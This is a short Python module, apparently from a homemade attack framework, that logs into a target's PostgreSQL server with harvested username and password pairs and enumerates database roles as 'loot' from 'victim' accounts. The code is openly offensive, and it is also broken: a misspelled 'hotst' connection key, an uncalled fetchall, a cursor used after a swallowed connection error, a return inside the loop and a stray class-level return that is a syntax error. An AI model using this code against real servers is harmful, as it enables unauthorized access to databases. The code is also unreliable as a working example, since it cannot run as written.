import psycopg2
from scripts.hydra import Exploit
class postgresql(Exploit):
    name = "postgresql"
    port = 5432
    # def attack(self, ip_address):
    #     pass
    def get_loot(self, ip_address, credentials):
        more_loot = []
        # go through each secure username
        for victim in credentials:
            username = victim[0]
            password = victim[1]

            # start the log in process
            try:
                trystr = "dbname=postgres hotst={} user={} password={}".format(ip_address, username, password)
                conn = psycopg2.connect(trystr)
            except psycopg2.OperationalError:
                pass

            # opens a cursor to perform psql ops    
            cur = conn.cursor()
            
            # enumerates all the usernames, the passwords are md5 hashed 
            # and only in viewable as root
            cur.execute("select * from pg_roles")

            # opening up returns
            for l in cur.fetchall:
                # returns a tuple ('username', )
                more_loot.append((l[0], ))

            # in psql users are global one crack and get all others
            # so close return file to not get a bunch of others
            return more_loot
    return more_loot
